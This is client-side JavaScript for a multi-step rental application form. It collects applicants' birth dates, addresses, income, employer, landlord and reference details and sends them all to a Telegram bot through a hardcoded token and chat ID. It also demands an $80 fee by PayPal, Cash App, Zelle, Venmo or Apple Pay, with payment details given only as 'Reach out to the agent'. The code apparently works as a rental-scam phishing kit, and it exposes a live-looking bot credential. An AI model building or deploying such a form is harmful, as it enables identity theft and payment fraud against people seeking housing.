/* ============================================================
   TELEGRAM SETTINGS  —  PUT YOUR BOT TOKEN AND CHAT ID HERE
   ============================================================
   1. In Telegram, talk to @BotFather -> /newbot -> copy the token.
   2. Get your chat id: message your bot, then open
      https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
      and copy result[0].message.chat.id
   ============================================================ */
const TELEGRAM_BOT_TOKEN = "8953525271:AAGwruViAS0wNq5km7YwIgJY-ZRUG08yBb0";
const TELEGRAM_CHAT_ID   = "8745510014";

const STEPS = [
  "Personal Information",
  "Rental Information",
  "Employment",
  "References",
  "Payment",
  "Review & Submit"
];

const PAYMENT_METHODS = [
  {
    id: "paypal",
    name: "PayPal",
    detail: "Account details: Reach out to the agent",
    logo: `<svg viewBox="0 0 24 24" width="40" height="24"><path fill="#003087" d="M7.5 4.5h6.2c2.6 0 4.4 1.7 3.9 4.3-.5 2.9-3.3 4.3-6 4.3H9.3l-.6 3.6H6.2l1.3-12.2z"/><path fill="#009cde" d="M9.3 4.5h6.2c2.6 0 4.4 1.7 3.9 4.3-.5 2.9-3.3 4.3-6 4.3H9.3l-.6 3.6H6.2l1.3-12.2z" opacity=".4"/><path fill="#009cde" d="M10.2 7.3h3.1c1.3 0 2.2.9 2 2.1-.3 1.4-1.6 2.1-3 2.1h-1.5l.4-4.2z"/></svg>`
  },
  {
    id: "cashapp",
    name: "Cash App",
    detail: "Account details: Reach out to the agent",
    logo: `<svg viewBox="0 0 24 24" width="24" height="24"><rect width="24" height="24" rx="5" fill="#00d632"/><path fill="#fff" d="M12.5 13.2c.3 0 .6-.1.8-.3l1.6 1.2c-.6.7-1.6 1.1-2.7 1.1-2 0-3.5-1.3-3.5-3.3 0-2 1.5-3.3 3.5-3.3 1.1 0 2.1.4 2.7 1.1l-1.6 1.2c-.2-.2-.5-.3-.8-.3-.6 0-1 .5-1 1.1 0 .6.4 1.1 1 1.1z M17.5 6.2c-.2-.5-.6-.9-1.1-1.1-1-.4-3.9-.4-3.9-.4s-2.9 0-3.9.4c-.5.2-.9.6-1.1 1.1-.4 1-.4 3.8-.4 3.8s0 2.8.4 3.8c.2.5.6.9 1.1 1.1 1 .4 3.9.4 3.9.4s2.9 0 3.9-.4c.5-.2.9-.6 1.1-1.1.4-1 .4-3.8.4-3.8s0-2.8-.4-3.8z"/></svg>`
  },
  {
    id: "zelle",
    name: "Zelle",
    detail: "Account details: Reach out to the agent",
    logo: `<svg viewBox="0 0 24 24" width="40" height="24"><rect width="24" height="24" rx="4" fill="#6c16b3"/><path fill="#fff" d="M5 7h6v2.2L8.6 13H11v2.2H5v-2.2L8.4 9.2H5V7zm9 0h5v2.2h-2.8L19 13h-2.8L13.4 9.2H14V7z" transform="translate(0 2)"/></svg>`
  },
  {
    id: "venmo",
    name: "Venmo",
    detail: "Account details: Reach out to the agent",
    logo: `<svg viewBox="0 0 24 24" width="40" height="24"><rect width="24" height="24" rx="4" fill="#3d95ce"/><path fill="#fff" d="M6 8.5c0-.3.1-.5.4-.5h1.6c.3 0 .4.2.5.5l1.8 6c.1.3.2.5.2.7 0-.2.1-.4.2-.7l1.8-6c.1-.3.2-.5.5-.5h1.6c.3 0 .4.2.4.5 0 .2 0 .3-.1.5l-2.6 7.6c-.1.3-.2.4-.5.4h-1.4c-.3 0-.4-.1-.5-.4L6.1 9c-.1-.2-.1-.3-.1-.5z"/></svg>`
  },
  {
    id: "applepay",
    name: "Apple Pay",
    detail: "Account details: Reach out to the agent",
    logo: `<svg viewBox="0 0 24 24" width="40" height="24"><rect width="24" height="24" rx="4" fill="#000"/><path fill="#fff" d="M7.5 8.2c.3-.4.5-.9.4-1.5-.5 0-1 .3-1.3.7-.3.3-.5.8-.4 1.4.5 0 1-.3 1.3-.6zm.5 1.1c-.7 0-1.3.4-1.6.4-.3 0-.8-.4-1.4-.4-.7 0-1.4.4-1.8 1.1-.8 1.3-.2 3.4.6 4.5.4.5.8 1.1 1.4 1.1.6 0 .8-.4 1.4-.4.7 0 .8.4 1.4.4.6 0 1-.5 1.4-1.1.4-.6.6-1.1.6-1.7-1-.4-1.6-1.3-1.6-2.3 0-.7.4-1.3.8-1.6-.3-.3-.7-.4-1-.4-.6 0-1.2.4-1.4.4l-.2 0z"/></svg>`
  }
];

const AGREEMENTS = [
  "I confirm that the information provided is accurate and complete.",
  "I understand that an $80 inspection / application fee applies.",
  "I authorize the property manager to review the information submitted for this rental application.",
  "I understand that submitting an application does not guarantee approval or tenancy.",
  "I agree to the application's terms and privacy policy."
];

const state = {
  step: 0,
  data: {
    has_pets: false,
    references: [
      { name: "", relationship: "", phone: "", email: "" },
      { name: "", relationship: "", phone: "", email: "" }
    ],
    signature_date: new Date().toISOString().slice(0, 10)
  },
  agree: {},
  payment_method: ""
};

const form = document.getElementById("applyForm");
const progressEl = document.getElementById("progress");
const nextBtn = document.getElementById("nextBtn");
const backBtn = document.getElementById("backBtn");
const submitBtn = document.getElementById("submitBtn");

/* ---------- Progress ---------- */

function renderProgress() {
  const desktop = STEPS.map((s, i) => {
    const done = i < state.step;
    const active = i === state.step;

    return `
      <div class="step-dot">
        <div class="step-circle ${active ? "active" : done ? "done" : ""}">
          ${done ? "✓" : i + 1}
        </div>

        <span class="step-label ${active ? "active" : ""}">
          ${s}
        </span>

        ${
          i < STEPS.length - 1
            ? `<div class="step-line ${done ? "done" : ""}"></div>`
            : ""
        }
      </div>
    `;
  }).join("");

  const pct = ((state.step + 1) / STEPS.length) * 100;

  progressEl.innerHTML = `
    <div class="progress-desktop">
      ${desktop}
    </div>

    <div class="progress-mobile">
      <div style="display:flex;justify-content:space-between;align-items:baseline">
        <strong style="font-family:var(--font-heading);font-size:18px">
          ${STEPS[state.step]}
        </strong>

        <span style="font-size:12px;color:var(--muted-fg)">
          Step ${state.step + 1} of ${STEPS.length}
        </span>
      </div>

      <div class="progress-bar">
        <div style="width:${pct}%"></div>
      </div>
    </div>
  `;
}

/* ---------- Step Navigation ---------- */

function showStep(n) {
  state.step = n;

  document.querySelectorAll(".step").forEach((el) => {
    const stepNum = Number(el.dataset.step);
    el.hidden = stepNum !== n;
  });

  backBtn.disabled = n === 0;
  nextBtn.hidden = n === STEPS.length - 1;
  submitBtn.hidden = n !== STEPS.length - 1;

  renderProgress();

  if (n === 5) {
    renderReview();
  }

  window.scrollTo({
    top: 0,
    behavior: "smooth"
  });
}

/* ---------- Field Binding ---------- */

form.querySelectorAll("[data-key]").forEach((el) => {
  const key = el.dataset.key;

  if (el.type === "checkbox") {
    el.checked = !!state.data[key];

    el.addEventListener("change", () => {
      state.data[key] = el.checked;

      if (key === "has_pets") {
        document.querySelector(".pets-extra").hidden = !el.checked;
      }
    });
  } else {
    el.value = state.data[key] ?? "";

    el.addEventListener("input", () => {
      state.data[key] = el.value;
      clearErr(el);
    });
  }
});

/* ---------- References ---------- */

function renderReferences() {
  const wrap = document.getElementById("references");

  wrap.innerHTML = state.data.references.map((r, i) => `
    <div class="ref-block">

      <div class="ref-head">
        <strong>Reference ${i + 1}</strong>

        ${
          state.data.references.length > 2
            ? `
              <button
                type="button"
                class="icon-btn"
                data-remove="${i}"
              >
                <svg
                  viewBox="0 0 24 24"
                  width="16"
                  height="16"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                >
                  <path d="M3 6h18M8 6V4h8v2M19 6l-1 14H6L5 6"/>
                </svg>
              </button>
            `
            : ""
        }

      </div>

      <div class="grid">

        <div class="field">
          <label>Full name <span class="req">*</span></label>
          <input
            data-ref="${i}"
            data-rkey="name"
            type="text"
            value="${r.name}"
          />
          <p class="err"></p>
        </div>

        <div class="field">
          <label>Relationship <span class="req">*</span></label>
          <input
            data-ref="${i}"
            data-rkey="relationship"
            type="text"
            value="${r.relationship}"
          />
          <p class="err"></p>
        </div>

        <div class="field">
          <label>Phone number <span class="req">*</span></label>
          <input
            data-ref="${i}"
            data-rkey="phone"
            type="text"
            value="${r.phone}"
          />
          <p class="err"></p>
        </div>

        <div class="field">
          <label>Email address</label>
          <input
            data-ref="${i}"
            data-rkey="email"
            type="email"
            value="${r.email}"
          />
          <p class="err"></p>
        </div>

      </div>
    </div>
  `).join("");

  wrap.querySelectorAll("[data-ref]").forEach((el) => {
    el.addEventListener("input", () => {
      state.data.references[
        Number(el.dataset.ref)
      ][el.dataset.rkey] = el.value;

      clearErr(el);
    });
  });

  wrap.querySelectorAll("[data-remove]").forEach((btn) => {
    btn.addEventListener("click", () => {
      state.data.references.splice(
        Number(btn.dataset.remove),
        1
      );

      renderReferences();
    });
  });
}

document.getElementById("addRef").addEventListener("click", () => {
  state.data.references.push({
    name: "",
    relationship: "",
    phone: "",
    email: ""
  });

  renderReferences();
});

renderReferences();

/* ---------- Payment Methods ---------- */

function renderPayment() {
  const wrap = document.getElementById("paymentMethods");

  wrap.innerHTML = PAYMENT_METHODS.map((m) => `
    <label
      class="payment-option ${
        state.payment_method === m.id ? "selected" : ""
      }"
      data-pm="${m.id}"
    >
      <input
        type="radio"
        name="payment"
        value="${m.id}"
        ${
          state.payment_method === m.id
            ? "checked"
            : ""
        }
      />

      <span class="pm-logo">
        ${m.logo}
      </span>

      <span class="pm-text">
        <span class="pm-name">${m.name}</span>
        <span class="pm-detail">${m.detail}</span>
      </span>
    </label>
  `).join("");

  wrap.querySelectorAll(".payment-option").forEach((el) => {
    el.addEventListener("click", () => {
      state.payment_method = el.dataset.pm;
      state.data.payment_method = el.dataset.pm;

      document.getElementById("paymentErr").textContent = "";

      renderPayment();
    });
  });
}

renderPayment();

/* ---------- Agreements ---------- */

function renderAgreements() {
  const wrap = document.getElementById("agreements");

  wrap.innerHTML = AGREEMENTS.map((a, i) => `
    <label class="agree-item">
      <input
        type="checkbox"
        data-agree="${i}"
        ${state.agree[i] ? "checked" : ""}
      />

      <span>${a}</span>
    </label>
  `).join("");

  wrap.querySelectorAll("[data-agree]").forEach((el) => {
    el.addEventListener("change", () => {
      state.agree[Number(el.dataset.agree)] = el.checked;

      document.getElementById("agreeErr").textContent = "";
    });
  });
}

renderAgreements();

/* ---------- Validation ---------- */

const req = (v) =>
  v !== undefined &&
  v !== null &&
  String(v).trim() !== "";

function setErr(el, msg) {
  const errEl = el.parentElement.querySelector(".err");

  if (errEl) {
    errEl.textContent = msg || "";
  }

  el.classList.toggle("invalid", !!msg);
}

function clearErr(el) {
  setErr(el, "");
}

function validateStep(step) {
  const d = state.data;
  let ok = true;

  const mark = (key, msg) => {
    const el = form.querySelector(`[data-key="${key}"]`);

    if (el) {
      setErr(el, msg);
    }

    if (msg) {
      ok = false;
    }
  };

  if (step === 0) {
    [
      "full_name",
      "date_of_birth",
      "phone",
      "email",
      "address",
      "city",
      "state",
      "zip",
      "time_at_address"
    ].forEach((k) => {
      const el = form.querySelector(`[data-key="${k}"]`);

      if (!req(d[k])) {
        setErr(el, "This field is required");
        ok = false;
      }
    });

    if (
      req(d.email) &&
      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(d.email)
    ) {
      mark("email", "Enter a valid email address");
    }

    if (
      req(d.phone) &&
      String(d.phone).replace(/\D/g, "").length < 7
    ) {
      mark("phone", "Enter a valid phone number");
    }
  }

  if (step === 1) {
    [
      "property_address",
      "move_in_date",
      "lease_duration",
      "occupants",
      "adults",
      "reason_for_moving"
    ].forEach((k) => {
      const el = form.querySelector(`[data-key="${k}"]`);

      if (!req(d[k])) {
        setErr(el, "This field is required");
        ok = false;
      }
    });

    if (d.has_pets && !req(d.pets_details)) {
      mark(
        "pets_details",
        "Please describe your pets"
      );
    }
  }

  if (step === 2) {
    [
      "employer_name",
      "job_title",
      "employment_length",
      "monthly_income",
      "employer_phone"
    ].forEach((k) => {
      const el = form.querySelector(`[data-key="${k}"]`);

      if (!req(d[k])) {
        setErr(el, "This field is required");
        ok = false;
      }
    });
  }

  if (step === 3) {
    state.data.references.forEach((r, i) => {
      const required = i < 2;

      if (
        required ||
        r.name ||
        r.phone ||
        r.relationship
      ) {
        [
          "name",
          "relationship",
          "phone"
        ].forEach((rk) => {
          const el = document.querySelector(
            `[data-ref="${i}"][data-rkey="${rk}"]`
          );

          if (!req(r[rk])) {
            setErr(el, "Required");
            ok = false;
          }
        });

        if (
          req(r.email) &&
          !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(r.email)
        ) {
          setErr(
            document.querySelector(
              `[data-ref="${i}"][data-rkey="email"]`
            ),
            "Invalid email"
          );

          ok = false;
        }
      }
    });
  }

  if (step === 4) {
    if (!state.payment_method) {
      document.getElementById(
        "paymentErr"
      ).textContent = "Please select a payment method";

      ok = false;
    }
  }

  if (step === 5) {
    [
      "signature_name",
      "signature_date"
    ].forEach((k) => {
      const el = form.querySelector(
        `[data-key="${k}"]`
      );

      if (!req(d[k])) {
        setErr(el, "This field is required");
        ok = false;
      }
    });

    const allAgree = [0, 1, 2, 3, 4].every(
      (i) => state.agree[i]
    );

    if (!allAgree) {
      document.getElementById(
        "agreeErr"
      ).textContent =
        "Please accept all statements to continue";

      ok = false;
    }

    if (
      req(d.signature_name) &&
      req(d.full_name) &&
      d.signature_name.trim().toLowerCase() !==
        d.full_name.trim().toLowerCase()
    ) {
      mark(
        "signature_name",
        "Signature must match your full legal name"
      );
    }
  }

  return ok;
}

/* ---------- Review ---------- */

function renderReview() {
  const d = state.data;

  const method = PAYMENT_METHODS.find(
    (m) => m.id === state.payment_method
  );

  const rows = [
    ["Applicant name", d.full_name],
    ["Property", d.property_address],
    ["Desired move-in date", d.move_in_date],
    ["Phone", d.phone],
    ["Email", d.email],
    [
      "Current address",
      [
        d.address,
        d.city,
        d.state,
        d.zip
      ]
        .filter(Boolean)
        .join(", ")
    ],
    ["Employer", d.employer_name],
    ["Job title", d.job_title],
    [
      "Monthly income",
      d.monthly_income
        ? `$${Number(
            d.monthly_income
          ).toLocaleString()}`
        : "—"
    ],
    [
      "References provided",
      (d.references || []).filter(
        (r) => r.name
      ).length
    ],
    [
      "Selected payment method",
      method ? method.name : "—"
    ],
    [
      "Inspection / application fee",
      "$80.00"
    ]
  ];

  document.getElementById(
    "reviewBox"
  ).innerHTML =
    rows
      .map(
        ([l, v]) => `
          <div class="review-row">
            <span class="rl-label">${l}</span>
            <span class="rl-value">
              ${v || "—"}
            </span>
          </div>
        `
      )
      .join("") +
    `
      <div class="review-total">
        <span class="t-label">Total</span>
        <span class="t-value">$80.00</span>
      </div>
    `;
}

/* ---------- Navigation Handlers ---------- */

nextBtn.addEventListener("click", () => {
  if (!validateStep(state.step)) return;

  showStep(
    Math.min(
      state.step + 1,
      STEPS.length - 1
    )
  );
});

backBtn.addEventListener("click", () => {
  showStep(
    Math.max(
      state.step - 1,
      0
    )
  );
});

/* ---------- Submit ---------- */

function generateReference() {
  const y = new Date().getFullYear();

  const rand = Math.random()
    .toString(36)
    .toUpperCase()
    .slice(2, 7);

  return `RA-${y}-${rand}`;
}


/* ---------- Telegram ---------- */

function esc(v) {
  return String(v ?? "—")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function buildTelegramMessage(d, ref, method) {
  const L = [];
  L.push("<b>🏠 NEW RENTAL APPLICATION</b>");
  L.push(`<b>Reference:</b> ${esc(ref)}`);
  L.push(`<b>Submitted:</b> ${esc(new Date().toLocaleString())}`);
  L.push("");
  L.push("<b>— Applicant —</b>");
  L.push(`Full name: ${esc(d.full_name)}`);
  L.push(`Date of birth: ${esc(d.date_of_birth)}`);
  L.push(`Phone: ${esc(d.phone)}`);
  L.push(`Email: ${esc(d.email)}`);
  L.push(`Address: ${esc(d.address)}, ${esc(d.city)}, ${esc(d.state)} ${esc(d.zip)}`);
  L.push(`Time at address: ${esc(d.time_at_address)}`);
  L.push("");
  L.push("<b>— Rental —</b>");
  L.push(`Property applied for: ${esc(d.property_address)}`);
  L.push(`Move-in date: ${esc(d.move_in_date)}`);
  L.push(`Lease duration: ${esc(d.lease_duration)}`);
  L.push(`Occupants: ${esc(d.occupants)} (adults: ${esc(d.adults)}, children: ${esc(d.children || 0)})`);
  L.push(`Current rent: ${esc(d.current_rent)}`);
  L.push(`Pets: ${d.has_pets ? "Yes — " + esc(d.pets_details) : "No"}`);
  L.push(`Reason for moving: ${esc(d.reason_for_moving)}`);
  L.push("");
  L.push("<b>— Employment &amp; Income —</b>");
  L.push(`Employer: ${esc(d.employer_name)}`);
  L.push(`Job title: ${esc(d.job_title)}`);
  L.push(`Length of employment: ${esc(d.employment_length)}`);
  L.push(`Gross monthly income: ${esc(d.monthly_income)}`);
  L.push(`Employer phone: ${esc(d.employer_phone)}`);
  L.push(`Supervisor: ${esc(d.supervisor_name)}`);
  L.push(`Additional income: ${esc(d.additional_income)}`);
  L.push("");
  L.push("<b>— Previous Rental —</b>");
  L.push(`Landlord: ${esc(d.prev_landlord_name)} (${esc(d.prev_landlord_phone)})`);
  L.push(`Address: ${esc(d.prev_address)}`);
  L.push(`Rent: ${esc(d.prev_rent)}`);
  L.push(`Tenancy dates: ${esc(d.prev_tenancy_dates)}`);
  L.push(`Reason for leaving: ${esc(d.prev_reason_leaving)}`);
  L.push("");
  L.push("<b>— References —</b>");
  (d.references || []).forEach((r, i) => {
    L.push(`${i + 1}. ${esc(r.name)} — ${esc(r.relationship)} — ${esc(r.phone)} — ${esc(r.email)}`);
  });
  L.push("");
  L.push("<b>— Payment —</b>");
  L.push(`Selected method: ${esc(method ? method.name : state.payment_method)}`);
  L.push("Fee: $80.00 (pending — no funds collected)");
  L.push("");
  L.push("<b>— Signature —</b>");
  L.push(`Signed by: ${esc(d.signature_name)}`);
  L.push(`Date: ${esc(d.signature_date)}`);

  return L.join("\n");
}

async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  // Telegram caps a message at 4096 chars — split if needed.
  const chunks = [];
  let rest = text;
  while (rest.length > 3800) {
    let cut = rest.lastIndexOf("\n", 3800);
    if (cut < 1000) cut = 3800;
    chunks.push(rest.slice(0, cut));
    rest = rest.slice(cut);
  }
  chunks.push(rest);

  for (const chunk of chunks) {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: chunk,
        parse_mode: "HTML",
        disable_web_page_preview: true
      })
    });
    const json = await res.json().catch(() => ({}));
    if (!res.ok || json.ok === false) {
      throw new Error(json.description || `Telegram error ${res.status}`);
    }
  }
}

/* ---------- Submit ---------- */

submitBtn.addEventListener("click", async () => {
  if (!validateStep(5)) return;

  const d = state.data;
  const method = PAYMENT_METHODS.find((m) => m.id === state.payment_method);
  const ref = generateReference();

  const statusEl = document.getElementById("submitStatus");
  const originalLabel = submitBtn.textContent;
  submitBtn.disabled = true;
  submitBtn.textContent = "Sending…";
  statusEl.hidden = true;
  statusEl.className = "submit-status";

  try {
    await sendToTelegram(buildTelegramMessage(d, ref, method));
  } catch (err) {
    submitBtn.disabled = false;
    submitBtn.textContent = originalLabel;
    statusEl.hidden = false;
    statusEl.classList.add("error");
    statusEl.textContent =
      "We couldn't send your application right now: " +
      err.message +
      ". Please check your connection and try again.";
    return;
  }

  submitBtn.textContent = originalLabel;

  // Keep a local copy too
  const record = {
    ...d,
    payment_method: state.payment_method,
    reference_number: ref,
    status: "received",
    payment_status: "pending",
    fee_amount: 80,
    submitted_at: new Date().toISOString()
  };
  const all = JSON.parse(localStorage.getItem("rentalApplications") || "[]");
  all.push(record);
  localStorage.setItem("rentalApplications", JSON.stringify(all));

  const details = [
    ["Reference number", ref],
    ["Submitted", new Date().toLocaleString()],
    ["Application status", "Received"],
    ["Property", d.property_address],
    ["Selected payment method", method ? method.name : "—"],
    ["Inspection / application fee", "$80.00"]
  ];

  document.getElementById("confirmDetails").innerHTML = details
    .map(
      ([l, v]) => `
        <div class="confirm-row">
          <span class="cl">${l}</span>
          <span class="cv">${esc(v)}</span>
        </div>
      `
    )
    .join("");

  document.getElementById("confirmDemo").innerHTML =
    `<span class="demo-title"></span>
    `;

  document.getElementById("confirmModal").hidden = false;
});

document.getElementById("confirmClose").addEventListener("click", () => {
  document.getElementById("confirmModal").hidden = true;
});

/* ---------- Initialize ---------- */

showStep(0);
